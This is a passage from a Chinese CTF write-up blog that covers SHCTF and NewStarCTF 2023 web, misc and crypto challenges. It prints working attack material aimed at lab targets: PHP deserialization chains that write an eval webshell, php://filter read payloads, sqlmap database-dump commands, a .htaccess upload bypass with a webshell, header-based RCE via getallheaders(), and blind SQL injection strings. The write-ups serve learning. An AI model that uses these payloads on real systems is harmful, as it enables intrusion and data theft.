用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目</strong>。</p></blockquote><p><strong>如果要满足<code>$$$scheme===&#39;SHCTF&#39;</code>，我们可以使<code>[scheme] =&gt; host</code>，导致<code>$$host===&#39;SHCTF&#39;</code>；再使得<code>[host] =&gt; user</code>导致<code>$user===&#39;SHCTF&#39;</code>，就满足条件。</strong></p><p>可以构造如下的数组</p><pre class="line-numbers language-none"><code class="language-none">Array(    [scheme] &#x3D;&gt; host    [host] &#x3D;&gt; user    [user] &#x3D;&gt; SHCTF    [pass] &#x3D;&gt; password    [path] &#x3D;&gt; &#x2F;path    [query] &#x3D;&gt; arg&#x3D;value    [fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>构造payload：host:&#x2F;&#x2F;SHCTF:password@user&#x2F;path?arg&#x3D;value#anchor</strong></p><p>得到的flag的MD5值为： <strong>5eff41d1008c731b14eec5d18c32d942</strong></p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021655560.png"></p><h4 id="第二步、获取flag的长度"><a href="#第二步、获取flag的长度" class="headerlink" title="第二步、获取flag的长度"></a><strong>第二步、获取flag的长度</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码if(isset($_GET[&#39;length&#39;]))&#123;    $num&#x3D;$_GET[&#39;length&#39;];    if($num*100!&#x3D;intval($num*100))&#123;      echo(strlen($flag));      echo(&quot;&lt;&#x2F;br&gt;&quot;);    &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以参考这位大佬的博客<a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">PHP intval()函数详解，intval()函数漏洞原理及绕过思路_intval绕过-CSDN博客</a></p><p>在<strong>intval函数</strong>中其会对所得的值进行取整，所以我们可以使**$num&#x3D;1.111**即可得到flag的长度</p><p>得到flag的长度为 42</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021659865.png"></p><h4 id="第三步、计算“md5-flag-urldecode-num-”"><a href="#第三步、计算“md5-flag-urldecode-num-”" class="headerlink" title="第三步、计算“md5($flag.urldecode($num))”"></a>第三步、计算“md5($flag.urldecode($num))”</h4><p>通过github上的<a href="https://github.com/shellfeel/hash-ext-attack">哈希长度扩展攻击利用脚本</a>可以通过已知的信息来求解</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021710096.png"></p><blockquote><p>所以目前已知信息满足该<strong>md5(“密文”+”处理过的已知字符串”)&#x3D;处理过的哈希值</strong>公式</p><p><strong>md5($flag+”\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00233”)&#x3D;7b0d8d07ac2974cc262613ed18d200df</strong></p></blockquote><p>将其中<strong>处理过的已知字符串</strong>将其\x替换为%进行url编码一下传参给length</p><p>再将<strong>处理过的hash值</strong>传参给SHCTF，执行即可得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021717025.png"></p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="快问快答"><a href="#快问快答" class="headerlink" title="快问快答"></a>快问快答</h3><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021756005.png"></p><p>根据这题提示以及尝试，要求我们2s内回答问题并连续答对50道，可想而知我们需要另辟蹊径了，即我们可以编写一个python代码来完成50道答题</p><p>代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsfrom bs4 import BeautifulSoupimport reimport time# 创建会话s &#x3D; requests.Session()url &#x3D; &#39;http:&#x2F;&#x2F;112.6.51.212:31530&#x2F;&#39; #url# 循环答题correct_answers &#x3D; 0for i in range(70):  # 除法运算时有些报错，影响了循环，这里改70    # 获取题目    r &#x3D; s.get(url)    r.encoding &#x3D; &#39;utf-8&#39;    soup &#x3D; BeautifulSoup(r.text, &quot;html.parser&quot;)    question_text &#x3D; soup.find(&quot;h3&quot;).text    print(question_text)    # 使用正则表达式从题目中提取数字和运算符    matches &#x3D; re.match(r&#39;题目：(\d+) (异或|与|[+\-x÷]) (\d+) &#x3D;&#39;, question_text)    # 等待一秒    time.sleep(1)    if matches:        num1 &#x3D; int(matches.group(1))        operator &#x3D; matches.group(2)        num2 &#x3D; int(matches.group(3))        if operator &#x3D;&#x3D; &#39;+&#39;:            answer &#x3D; num1 + num2        elif operator &#x3D;&#x3D; &#39;-&#39;:            answer &#x3D; num1 - num2        elif operator &#x3D;&#x3D; &#39;x&#39;:            answer &#x3D; num1 * num2        elif operator &#x3D;&#x3D; &#39;÷&#39;:            answer &#x3D; num1 &#x2F; num2        elif operator &#x3D;&#x3D; &#39;异或&#39;:            answer &#x3D; num1 ^ num2        elif operator &#x3D;&#x3D; &#39;与&#39;:            answer &#x3D; num1 &amp; num2        # 准备POST数据        data &#x3D; &#123;&quot;answer&quot;: answer&#125;        # 发送答案        response &#x3D; s.post(url, data&#x3D;data)        print(f&quot;答案：&#123;answer&#125;&quot;)        print(response.text)  # 输出对应的response.text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021806467.png"></p><h3 id="sseerriiaalliizzee"><a href="#sseerriiaalliizzee" class="headerlink" title="sseerriiaalliizzee"></a>sseerriiaalliizzee</h3><p>本题从题目看就是一道POC链 题目</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class Start&#123;    public $barking;    public function __construct()&#123;        $this-&gt;barking &#x3D; new Flag;    &#125;    public function __toString()&#123;            return $this-&gt;barking-&gt;dosomething();    &#125;&#125;class CTF&#123;     public $part1;    public $part2;    public function __construct($part1&#x3D;&#39;&#39;,$part2&#x3D;&#39;&#39;) &#123;        $this -&gt; part1 &#x3D; $part1;        $this -&gt; part2 &#x3D; $part2;            &#125;    public function dosomething()&#123;        $useless   &#x3D; &#39;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#39;;        $useful&#x3D; $useless. $this-&gt;part2;        file_put_contents($this-&gt; part1,$useful);    &#125;&#125;class Flag&#123;    public function dosomething()&#123;        include(&#39;.&#x2F;flag,php&#39;);        return &quot;barking for fun!&quot;;    &#125;&#125;    $code&#x3D;$_POST[&#39;code&#39;];     if(isset($code))&#123;       echo unserialize($code);    &#125;    else&#123;        echo &quot;no way, fuck off&quot;;    &#125;?&gt; no way, fuck off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>本题可以构造的POC链为</strong></p><p><strong>Start __construct() -&gt; Start __toString() -&gt; CTF dosomething()</strong></p><p>这其中我们需要考虑的是如何绕过CTF类中的$useless里面的die方法，如果使其执行，那么代码直接结束，我们想要写入的代码也无法写入，通过上网搜索，可以通过base编码来绕过</p><blockquote><p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p><pre class="line-numbers language-none"><code class="language-none">$filename&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php&#39;;$content &#x3D; &#39;aPD9waHAgcGhwaW5mbygpOz8+&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p></blockquote><p>具体详情可以看这位大佬博客<a href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></p><p>所以我们可以如此构造POC链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a &#x3D; new Start();$b &#x3D; new CTF();$a -&gt; barking &#x3D; $b;$b -&gt; part1 &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.php&quot;;$b -&gt; part2 &#x3D;  &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_POST[1]); ?&gt;&#39;);echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将序列化后的值传参进去</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021932320.png"></p><p>然后访问我们设置的php位置并输入相关查询指令</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021936942.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB、学习、新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023NewStarCTF-Week2-部分WP</title>
      <link href="/2023/10/25/2023NewStarCTF-Week2-%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/10/25/2023NewStarCTF-Week2-%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>本题打开为一个js前端游戏，我们可以通过过关条件查询来找到flag所在位置（即本关需要100000分才可以得到flag）</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251514231.png"></p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251513016.png"></p><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251514155.png"></p><p>本题需要我们通过伪协议读取，但是其过滤常见的base和rot读取，所以我们需要通过另一种方法来读取,即utf-8等之类的语言读取flag</p><p>构造payload</p><p><strong>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16&#x2F;resource&#x3D;flag.php</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251904828.png"></p><p>官方payload：</p><p><u><strong>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php</strong></u></p><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251911937.png"></p><p>尝试发现有sql注入点，这里我选择用sqlmap一把梭了，如下</p><p><strong>指令–爆库:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ –dbs –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251915567.png"></p><p>猜测其在ctf中，继续下一项爆表</p><p><strong>指令–爆表:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf –tables –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251916539.png"></p><p>显而易见在here_is_flag中，所以接下来爆列</p><p><strong>指令–爆列:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf -T here_is_flag –columns –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251917023.png"></p><p>最后一项，爆flag列中字段</p><p><strong>指令–爆字段:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf -T here_is_flag -C flag –dump –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251918273.png"></p><h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><p>打开本题连接可看到上述php代码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251921715.png"></p><p>在__destruct中过滤了一些常见看文件的命令，然后通过system执行该命令</p><p>先编写一个序列化，通过给$cmd赋值**ls &#x2F;**看看根目录下有哪些文件，这里的$cmd是被private保护的，所以如果为了避免private，可以选择将序列化后的结果加上urlencode，如下图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251933811.png"></p><p>也可以在php编译器中将private改为public然后正常序列化输出</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251931550.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251932607.png"></p><p>可以看到里面有着<strong>th1s_1s_fffflllll4444aaaggggg</strong> 显而易见，flag就在其中，所以我们将**$cmd**的命令改变一下</p><p><strong>$cmd &#x3D; ‘uniq &#x2F;th1s_1s_fffflllll4444aaaggggg’;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251934849.png"></p><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>刚开始看到本题，我想着通过图片幻术头绕过检测，不过还是被其检测出来，说明问题出在后面的语句里，所以将其修改为另一种形式</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251944996.png"></p><p><strong>即：<script language="php">@eval($_POST['shell']);</script></strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251945983.png"></p><p>发现如此也还是不行，但jpg文件可以上传，那么这就需要用到.htaccess文件</p><p><strong>通过在其编写：AddType application&#x2F;x-httpd-php .jpg</strong>，让服务器对其当作php文件分析，</p><p>然后再通过蚁剑连接得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251947670.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251948686.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251949393.png"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252018637.png"></p><p>打开后就只有这么一段话</p><p>使用dirsearch扫描从中扫到了.git，说明我们通过git源码泄露得到源码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252027542.png"></p><p>再通过GitHack工具去获取源码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252029377.png"></p><p>打开bo0g1pop.php文件，内容为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;star&#39;])) &#123;    if(!preg_match(&#39;&#x2F;high|get_defined_vars|scandir|var_dump|read|file|php|curent|end&#x2F;i&#39;,$_GET[&#39;star&#39;]))&#123;        eval($_GET[&#39;star&#39;]);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据**’;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\W]+\((?R)?\)&#x2F;‘, ‘’, $_GET[‘star’]**知晓其为无参数rce命令执行</p><p>然后接下来过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，</p><p>通过BP抓包</p><p><strong>构造: url&#x2F;?bo0g1pop.php?star&#x3D;eval(next(getallheaders()));</strong></p><p><strong>官方: url&#x2F;?bo0g1pop.php?star&#x3D;eval(pos(array_reverse(getallheaders())));</strong> </p><p><code>getallheaders()</code> 函数用于从 HTTP 请求头中获取所有的头信息，然后调用 <code>next()</code> 函数返回数组中的下一个元素，并将其作为参数传递给 <code>eval()</code> 函数来执行 </p><p>执行中就User-Agent的回显，所以在User-Agent的头上写着命令执行的指令，从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252041358.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h3><p>本题按官方wp进行复现</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$shell&#x3D;&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#39;编码太长，省略一下&#39;)))));&quot;;for($i&#x3D;0; $i&lt;50; $i++) &#123;        if(preg_match(&quot;&#x2F;base64&#x2F;&quot;,$shell)) &#123;                $tmp &#x3D; preg_replace(&quot;&#x2F;eval&#x2F;&quot;,&quot;return &quot;,$shell);                $shell &#x3D; eval($tmp);    &#125;    else&#123;                break;    &#125;&#125;echo $shell;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将其运行后可以得到<strong>get参和post参</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252051221.png"></p><p>然后将其传参后进行命令执行</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252053649.png"></p><h3 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h3><p>本题打开后就是一个里面充满着base64的txt文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291904062.png"></p><p>将Base64解密出来就是一些诗的句子，考虑为<code>Base64隐写</code>，所以通过python代码解密可以得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import base64path &#x3D; input(&quot;请输入加密文件路径:&quot;)file &#x3D; open(path)a &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;aaa &#x3D; &#39;&#39;while True:    text &#x3D; file.readline()  # 只读取一行内容    # 判断是否读取到内容    text &#x3D; text.replace(&quot;\n&quot;, &quot;&quot;)    if not text:        break    if text.count(&#39;&#x3D;&#39;) &#x3D;&#x3D; 1:        aaa &#x3D; aaa + \            str(&#39;&#123;:02b&#125;&#39;.format((a.find(text[len(text)-2])) % 4))    if text.count(&#39;&#x3D;&#39;) &#x3D;&#x3D; 2:        aaa &#x3D; aaa + \            str(&#39;&#123;:04b&#125;&#39;.format((a.find(text[len(text)-3])) % 16))file.close()t &#x3D; &quot;&quot;ttt &#x3D; len(aaa)ttt &#x3D; ttt&#x2F;&#x2F;8*8for i in range(0,ttt,8):    t &#x3D; t + chr(int( aaa[i:i+8],2))print(t)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291906217.png"></p><p>再将其值通过base58解密可以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291908539.png"></p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>本题通过复现官方WP所得，其所考的为SQL日志分析</p><p>从文件我们可以得到Web请求日志</p><pre class="line-numbers language-none"><code class="language-none">-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),1,1))&#x3D;40,sleep(1),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当其注入某一正确字符时会停止爆破，进入下一位的注入，例如下图中的109，110·····，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291914795.png"></p><p>通过python脚本来跑出flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import reimport urllib.parse# 打开文件并读取数据with open(&#39;access.log&#39;, &#39;r&#39;) as f:    lines &#x3D; f.readlines()datas &#x3D; []# 解码URL并存储到datas列表中for line in lines:    t &#x3D; urllib.parse.unquote(line)    datas.append(t)flag_ascii &#x3D; &#123;&#125;# 使用正则表达式匹配数据并提取信息for data in datas:    matchObj &#x3D; re.search(r&#39;user\),(.*?),1\)\)&#x3D;(.*?),sleep&#39;, data)    if matchObj:        key &#x3D; int(matchObj.group(1))        value &#x3D; int(matchObj.group(2))        flag_ascii[key] &#x3D; valueflag &#x3D; &#39;&#39;# 构建flag字符串for value in flag_ascii.values():    flag +&#x3D; chr(value)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291916118.png"></p><h3 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403211858708.png"></p><p>打开word文档发现考点是隐藏文字和佛曰解密，但是其中的信息我们复制后无法粘贴出去，需要通过wps中的<code>清除格式</code>来解决。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403211950863.png"></p><p>然后将其放入该网站<a href="http://hi.pcmoe.net/buddha.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY">http://hi.pcmoe.net/buddha.html</a>中进行解密即可拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403211949533.png"></p><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h3><h3 id="JVAV"><a href="#JVAV" class="headerlink" title="JVAV"></a>JVAV</h3><p>本题给出的提示就是注意图片，通过<code>JVAV</code>可以联想到的就是我们熟知的<code>JAVA</code>，而java在图片中的考点一般就是JAVA盲水印，我们也通过一个软件看到其确实存在盲水印</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403212004867.png"></p><p>所以我们需要一个更清晰的软件<a href="https://github.com/ww23/BlindWatermark/%E5%8E%BB%E8%8E%B7%E5%8F%96flag">https://github.com/ww23/BlindWatermark/去获取flag</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403212148113.png"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="滴啤"><a href="#滴啤" class="headerlink" title="滴啤"></a>滴啤</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *import gmpy2from flag import flagdef gen_prime(number):    p &#x3D; getPrime(number&#x2F;&#x2F;2)    q &#x3D; getPrime(number&#x2F;&#x2F;2)    return p,qm &#x3D; bytes_to_long(flag.encode())p,q &#x3D; gen_prime(1024)print(p*q)e &#x3D; 65537d &#x3D; gmpy2.invert(e,(p-1)*(q-1))print(d%(p-1))print(pow(m,e,p*q))# 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931# 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635# 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题我们目前已知<code>p*q</code>，即<code>n</code>、<code>d%(p-1)</code>，即<code>dp</code>、<code>pow(m,e,p*q)</code>，即<code>c</code>、<code>e</code>、</p><p>所以本题的性质就变成了已知<code>n</code>、<code>dp</code>、<code>c</code>、<code>e</code>，从而求出明文m，可以从这位大佬里面找到<a href="https://blog.csdn.net/m0_46230316/article/details/105904020">个人收集的RSA常用脚本_rsa算法脚本-CSDN博客</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *n &#x3D; 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931dp &#x3D; 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635c &#x3D; 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089e &#x3D; 65537r &#x3D; getPrime(64)pp &#x3D; pow(r, e*dp, n) - rp &#x3D; GCD(n, pp)q &#x3D; n &#x2F;&#x2F; pd &#x3D; inverse(e, (p-1)*(q-1))m &#x3D; pow(c, d, n)print(long_to_bytes(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>对于任意的小于p的非负自然数r, 有 r &#x3D; r^(e<em>dp) (mod p)   故 r^(e</em>dp) - r &#x3D; k*p,</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011937323.png"></p><h3 id="rotate-xor"><a href="#rotate-xor" class="headerlink" title="rotate_xor"></a>rotate_xor</h3><p>原题</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011939697.png"></p><p>我们已知了密文，<code>k1</code>通过<code>encrypt_key</code>计算过的值，并且也得知<code>k2</code>的值。</p><p>解密代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from z3 import *from Crypto.Util.number import *from pwn import xorROUND &#x3D; 12s &#x3D; Solver()ciphertext &#x3D; b&#39;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde&#96;zl\xc0\x85\xe0\xe4\xdfQlc&#39;enc_k1 &#x3D; BitVecVal(7318833940520128665, 64)k2 &#x3D; BitVecVal(9982833494309156947, 64)k1 &#x3D; BitVec(&#39;k1&#39;, 64)def encrypt_key(key):  for _ in range(ROUND):      key &#x3D; RotateLeft(key, 3) ^ k2  return keys.add(enc_k1 &#x3D;&#x3D; encrypt_key(k1))s.check()k1 &#x3D; s.model()[k1].as_long()flag &#x3D; xor(ciphertext, long_to_bytes(k1))print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011941508.png"></p><h3 id="不止一个pi"><a href="#不止一个pi" class="headerlink" title="不止一个pi"></a>不止一个pi</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">from flag import flagfrom Crypto.Util.number import *import gmpy2p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; p**3*q**2print(&quot;q &#x3D; &quot;,q)print(&quot;p &#x3D; &quot;,p)m &#x3D; bytes_to_long(flag.encode())c &#x3D; pow(m,65537,n)print(&quot;c &#x3D; &quot;,c)# q &#x3D;  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713# p &#x3D;  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217# c 